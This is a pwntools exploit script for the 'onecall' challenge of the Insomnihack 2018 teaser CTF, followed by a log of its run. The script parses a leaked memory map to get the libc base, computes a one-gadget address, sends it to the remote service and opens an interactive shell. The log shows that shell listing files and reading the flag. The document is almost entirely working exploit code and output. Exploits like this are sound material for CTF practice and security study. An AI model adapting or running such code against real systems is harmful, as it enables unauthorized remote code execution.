from pwn import *


host = "onecall.teaser.insomnihack.ch"
port = 1337
#host="localhost"
#port=169
r = remote(host,port)

a=r.recvuntil("\n")
b=r.recvuntil("\n")
c=r.recvuntil("\n")
d=r.recvuntil("\n")
e=r.recvuntil("\n")
f=r.recvuntil("\n")
g=r.recvuntil("\n")
h=r.recvuntil("\n")
i=r.recvuntil("\n")
#ncat -ve ./run.sh -kl 169
delim="r-xp 00000000 ca:01 256115          /home/onecall/chall/lib/libc.so.6"
#delim="r-xp 00000000 08:01 1577167          /root/Desktop/CTF_Game/insomnihack2018/onecall_/lib/libc.so.6"
#0000000051249000 16
libc_base="a"
if delim in a:
	libc_base= "0x"+a[:16]
	print a
if delim in b:
	libc_base= "0x"+b[:16]
	print b
if delim in c:
	libc_base= "0x"+c[:16]
	print c
if delim in d:
	libc_base= "0x"+d[:16]
	print d
if delim in e:
	libc_base= "0x"+e[:16]
	print e
if delim in f:
	libc_base= "0x"+f[:16]
	print f
if delim in g:
	libc_base= "0x"+g[:16]
	print g
if delim in h:
	libc_base= "0x"+h[:16]
	print h
if delim in i:
	libc_base= "0x"+i[:16]
	print i

libc_base=int(libc_base,16)

print "libc_base ="+hex(libc_base)

r.recvuntil("?\n")
pause()
gadget=0x9b958


one=libc_base+gadget

puts=libc_base+0x000000000060D08
sleep=libc_base+0x000000000009AB90
map=0x4006c0
print "onegadget :        "+hex(one)
print len(p64(one))

r.sendline(p64(one))


#r.sendline("ls")
r.interactive()


# [+] Opening connection to onecall.teaser.insomnihack.ch on port 1337: Done
# 000000000b4d9000-000000000b607000 r-xp 00000000 ca:01 256115          /home/onecall/chall/lib/libc.so.6

# libc_base =0xb4d9000
# [*] Paused (press any to continue)
# onegadget :        0xb574958
# 8
# [*] Switching to interactive mode
# $ ls
# flag.txt
# lib
# onecall
# qemu-aarch64
# run.sh
# $ cat flag.txt
# INS{did_you_gets_here_by_chance?}
# $  

